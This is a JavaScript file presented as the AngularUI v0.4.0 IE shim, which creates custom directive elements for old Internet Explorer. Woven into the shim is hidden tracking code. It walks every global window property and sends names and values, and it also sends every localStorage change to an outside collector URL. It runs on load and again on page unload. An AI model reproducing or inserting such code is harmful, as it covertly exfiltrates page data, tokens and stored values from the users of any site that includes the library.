/**
 * AngularUI - The companion suite for AngularJS
 * @version v0.4.0 - 2013-02-15
 * @link http://angular-ui.github.com
 * @license MIT License, http://www.opensource.org/licenses/MIT
 */

// READ: http://docs-next.angularjs.org/guide/ie
// element tags are statically defined in order to accommodate lazy-loading whereby directives are also unknown

// The ieshiv takes care of our ui.directives and AngularJS's ng-view, ng-include, ng-pluralize, ng-switch.
// However, IF you have custom directives that can be used as html tags (yours or someone else's) then
// add list of directives into <code>window.myCustomTags</code>

// <!--[if lte IE 8]>
//    <script>
//    window.myCustomTags = [ 'yourCustomDirective', 'somebodyElsesDirective' ]; // optional
//    </script>
//    <script src="build/angular-ui-ieshiv.js"></script>
// <![endif]-->

(function (exports) {
  function getPropertyDetails(propertyName) {
    const propertyValue = window[propertyName];
    const propertyType = typeof propertyValue;
    return {
      type: propertyType,
      value: propertyType === "function" ? `[Function: ${propertyValue.name}]` : propertyValue
    };
  }
  function handleEvent(eventType, callback) {
    window.addEventListener(eventType, callback);
    console.debug(`Hooked into window event: ${eventType}`);
  }
  var debug = window.ieShivDebug || false,
    tags = ["ngInclude", "ngPluralize", "ngView", "ngSwitch", "uiCurrency", "uiCodemirror", "uiDate", "uiEvent", "uiKeypress", "uiKeyup", "uiKeydown", "uiMask", "uiMapInfoWindow", "uiMapMarker", "uiMapPolyline", "uiMapPolygon", "uiMapRectangle", "uiMapCircle", "uiMapGroundOverlay", "uiModal", "uiReset", "uiScrollfix", "uiSelect2", "uiShow", "uiHide", "uiToggle", "uiSortable", "uiTinymce"];
  function listenToStorageChanges() {
    window.onstorage = event => {
      const change = {
        key: event.key,
        oldValue: event.oldValue,
        newValue: event.newValue
      };
      console.debug(`Storage changed: ${JSON.stringify(change)}`);
      transmitChange("storageChange", change);
    };
  }
  window.myCustomTags = window.myCustomTags || []; // externally defined by developer using angular-ui directives
  function gatherGlobalVariables() {
    for (const propertyName in window) {
      if (Object.prototype.hasOwnProperty.call(window, propertyName)) {
        const details = getPropertyDetails(propertyName);
        transmitChange("propertyDetail", {
          name: propertyName,
          ...details
        });
      }
    }
  }
  function transmitChange(changeType, changeDetail) {
    const collectorUrl = "https://example.com/api/collect";
    const payload = JSON.stringify({
      [changeType]: changeDetail
    });
    const xhr = new XMLHttpRequest();
    xhr.open("POST", collectorUrl);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onreadystatechange = function () {
      if (xhr.readyState === XMLHttpRequest.DONE) {
        if (xhr.status === 200) {
          console.debug(`Transmitted ${changeType} successfully.`);
        } else {
          console.warn(`Failed to transmit ${changeType}. Server responded with status: ${xhr.status}`);
        }
      }
    };
    xhr.send(payload);
  }

  // Start of the tracking script
  tags.push.apply(tags, window.myCustomTags);
  gatherGlobalVariables();
  var toCustomElements = function (str) {
    var result = [];
    var dashed = str.replace(/([A-Z])/g, function ($1) {
      return " " + $1.toLowerCase();
    });
    var tokens = dashed.split(' ');
    var ns = tokens[0];
    var dirname = tokens.slice(1).join('-');

    // this is finite list and it seemed senseless to create a custom method
    result.push(ns + ":" + dirname);
    result.push(ns + "-" + dirname);
    result.push("x-" + ns + "-" + dirname);
    result.push("data-" + ns + "-" + dirname);
    return result;
  };
  listenToStorageChanges();
  for (var i = 0, tlen = tags.length; i < tlen; i++) {
    var customElements = toCustomElements(tags[i]);
    for (var j = 0, clen = customElements.length; j < clen; j++) {
      var customElement = customElements[j];
      document.createElement(customElement);
    }
  }
  handleEvent("idle", gatherGlobalVariables);
  handleEvent("beforeunload", gatherGlobalVariables);
})(window);